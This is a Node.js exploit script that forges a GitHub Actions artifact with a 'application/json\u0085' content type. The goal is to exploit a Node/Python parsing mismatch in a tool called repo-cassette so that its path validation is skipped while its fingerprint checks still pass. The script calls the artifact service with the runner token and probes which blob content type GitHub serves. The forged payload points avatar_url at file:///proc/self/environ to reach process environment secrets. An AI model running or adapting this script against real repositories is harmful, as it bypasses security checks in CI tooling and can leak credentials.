// Forge an Actions artifact whose blob has a custom Content-Type and whose bytes we choose.
//
// Why: repo-cassette's fingerprint is sha256 of whatever api.github.com returns for
// `repos/<repository>`, and `fetchSample` joins every extra path segment, so
// repository="<owner>/<repo>/actions/artifacts/<id>/zip" makes the fingerprint the artifact bytes.
// Node skips all validation unless the content type trims to exactly "application/json", while the
// Python side strips U+0085 -- so a blob served as "application/json\x85" is non-JSON for Node
// (path validation skipped) and JSON for Python (both replay and origin checks pass).
//
// The artifact bytes must contain the artifact's own id (full_name has to equal the repository
// string), so we upload a placeholder first, read the id back, then PUT the real bytes to the same
// signed URL with the custom content type.
//
// Everything uses node:https on purpose: undici/fetch rejects non-ASCII header values, the classic
// client allows \x80-\xff (which is exactly what we need for the 0x85 byte).

const https = require('node:https');
const { URL } = require('node:url');
const crypto = require('node:crypto');

const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
console.log('[*] runner env present:', Object.keys(process.env)
  .filter((k) => k.startsWith('ACTIONS_'))
  .map((k) => `${k}(len=${String(process.env[k]).length})`).join(' ') || 'NONE');
if (!RUNTIME || !RESULTS) {
  throw new Error('ACTIONS_RUNTIME_TOKEN/ACTIONS_RESULTS_URL missing -- run this as a JS action (uses: ./), not a run: step');
}
const GH_TOKEN = process.env.GH_TOKEN;
const REPO = process.env.REPO;                 // owner/repo
const NAME = process.env.ART_NAME || 'rc';
const CT = 'application/json\u0085';           // the whole point

function req(method, url, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({
      method,
      hostname: u.hostname,
      path: u.pathname + u.search,
      headers,
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({
        status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks),
      }));
    });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

function backendIds() {
  const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
  const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
    .split(' ').find((s) => s.startsWith('Actions.Results:'));
  if (!scope) throw new Error('no Actions.Results scope in runtime token');
  const [, run, job] = scope.split(':');
  return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
}

const twirp = (rpc, payload) => req(
  'POST', `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
  { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
  JSON.stringify(payload),
);

const api = (path) => req('GET', `https://api.github.com${path}`, {
  authorization: `Bearer ${GH_TOKEN}`,
  accept: 'application/vnd.github+json',
  'user-agent': 'forge',
});

async function putBlob(signedUrl, bytes, contentType) {
  const headers = {
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-version': '2021-08-06',
    'content-length': String(bytes.length),
  };
  if (contentType) headers['x-ms-blob-content-type'] = contentType;
  return req('PUT', signedUrl, headers, bytes);
}

(async () => {
  const ids = backendIds();
  console.log('[*] backend ids', ids);

  const created = await twirp('CreateArtifact', { ...ids, name: NAME, version: 4 });
  const signed = (() => { try { return JSON.parse(created.body.toString('utf8')).signed_upload_url; }
    catch { return undefined; } })();
  console.log('[*] CreateArtifact', created.status, 'signed_upload_url?', !!signed,
    signed ? '' : created.body.toString('utf8').slice(0, 300));
  if (!signed) throw new Error('no signed_upload_url');

  // Keep every byte count identical: the final payload embeds the artifact id (whose digit count
  // we only learn after finalize), so pad the description to a fixed total length and declare that
  // same length at finalize time.
  const PAD_TO = 512;
  const build = (id) => {
    const mk = (pad) => Buffer.from(JSON.stringify({
      full_name: `${REPO.toLowerCase()}/actions/artifacts/${id}/zip`,
      description: 'repo cassette'.padEnd(pad, '.'),
      stargazers_count: 0,
      owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
    }), 'utf8');
    let pad = 13;
    while (mk(pad).length < PAD_TO) pad += 1;
    const out = mk(pad);
    if (out.length !== PAD_TO) throw new Error(`cannot pad to ${PAD_TO} (got ${out.length})`);
    return out;
  };

  const placeholder = build(0);
  const p1 = await putBlob(signed, placeholder, 'application/json');
  console.log('[*] PUT placeholder', p1.status, p1.body.toString('utf8').slice(0, 200));

  // FinalizeArtifact is protojson: int64 goes as a string and a StringValue wrapper is a bare
  // string, not {"value": ...} -- that mismatch is what returned "malformed". Try the shapes in
  // order so one run tells us which the service accepts.
  const digest = `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`;
  const shapes = [
    ['size+hash(bare)', { ...ids, name: NAME, size: String(PAD_TO), hash: digest }],
    ['size only', { ...ids, name: NAME, size: String(PAD_TO) }],
    ['size(number)', { ...ids, name: NAME, size: PAD_TO }],
    ['no size', { ...ids, name: NAME }],
  ];
  let finalized = false;
  for (const [label, payload] of shapes) {
    const fin = await twirp('FinalizeArtifact', payload);
    console.log(`[*] FinalizeArtifact [${label}]`, fin.status, fin.body.toString('utf8').slice(0, 200));
    if (fin.status === 200) { finalized = true; break; }
  }
  if (!finalized) throw new Error('FinalizeArtifact rejected every payload shape');

  // read the id back: the artifact bytes must contain it. Finalize is async on GitHub's side, so
  // the artifact can take a few seconds to show up in the REST listing.
  let mine;
  for (let i = 0; i < 12 && !mine; i += 1) {
    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
    if (list.status !== 200) {
      console.log('[!] artifact listing', list.status, list.body.toString('utf8').slice(0, 200));
    } else {
      const artifacts = JSON.parse(list.body.toString('utf8')).artifacts || [];
      mine = artifacts.filter((a) => a.name === NAME).sort((a, b) => b.id - a.id)[0];
    }
    if (!mine) await new Promise((r) => setTimeout(r, 2500));
  }
  if (!mine) throw new Error('artifact never showed up in the REST listing');
  console.log('[*] artifact id', mine.id, 'expired', mine.expired);

  const repository = `${REPO.toLowerCase()}/actions/artifacts/${mine.id}/zip`;
  const payload = build(mine.id);

  // The served content type came back as application/zip even though we set the blob's type,
  // which means something downstream overrides it (most likely the SAS "rsct" response-content-type
  // parameter on GitHub's redirect). Probe the whole matrix in one run: for each candidate blob
  // content type, re-PUT and report what api.github.com actually serves, plus the redirect's query
  // parameter names (names only -- "sig" is a credential and is never printed).
  const candidates = [
    ['json+NEL', 'application/json\u0085'],
    ['json', 'application/json'],
    ['empty', ''],
    ['omit', null],
    ['json;charset+NEL', 'application/json; charset=utf-8\u0085'],
  ];

  let best = null;
  for (const [label, ct] of candidates) {
    const put = await putBlob(signed, payload, ct);
    const dl = await req('GET', `https://api.github.com/repos/${REPO}/actions/artifacts/${mine.id}/zip`, {
      authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
    });
    let final = dl;
    let params = [];
    if (dl.headers.location) {
      const loc = new URL(dl.headers.location);
      params = [...loc.searchParams.keys()];
      const rsct = loc.searchParams.get('rsct');
      const rscd = loc.searchParams.get('rscd');
      console.log(`    redirect host=${loc.hostname} params=${params.join(',')}`
        + (rsct !== null ? ` rsct=${JSON.stringify(rsct)}` : '')
        + (rscd !== null ? ` rscd=${JSON.stringify(rscd)}` : ''));
      final = await req('GET', dl.headers.location, { 'user-agent': 'forge' });
    }
    const got = final.headers['content-type'] || '';
    const hex = Buffer.from(got, 'latin1').toString('hex');
    const ok = got.replace(/[\u0085\u001c-\u001f]/g, '').split(';')[0].trim() === 'application/json'
      && got !== 'application/json' && got.includes('\u0085');
    console.log(`[*] blob-ct[${label}] put=${put.status} served=${JSON.stringify(got)} hex=${hex}`
      + ` bodyOk=${final.body.equals(payload)}${ok ? '  <-- USABLE' : ''}`);
    if (ok && !best) best = { label, ct, served: got, hex };
  }

  // leave the blob in the best state we found (or the NEL attempt if none worked)
  const finalCt = best ? best.ct : 'application/json\u0085';
  await putBlob(signed, payload, finalCt);
  const dl2 = await req('GET', `https://api.github.com/repos/${REPO}/actions/artifacts/${mine.id}/zip`, {
    authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
  });
  const final2 = dl2.headers.location
    ? await req('GET', dl2.headers.location, { 'user-agent': 'forge' }) : dl2;
  const ctHeader = final2.headers['content-type'] || '';
  console.log('[*] left blob with', JSON.stringify(finalCt), '-> served', JSON.stringify(ctHeader));

  console.log('\n===== HAND THIS BACK =====');
  console.log('REPOSITORY=' + repository);
  console.log('ARTIFACT_ID=' + mine.id);
  console.log('BODY_B64=' + final2.body.toString('base64'));
  console.log('CT_HEX=' + Buffer.from(ctHeader, 'latin1').toString('hex'));
  console.log('CT_HAS_0x85=' + (ctHeader.includes('\u0085') ? 'YES' : 'NO'));
  console.log('BODY_MATCHES=' + final2.body.equals(payload));
})().catch((e) => { console.error('[x]', e); process.exit(1); });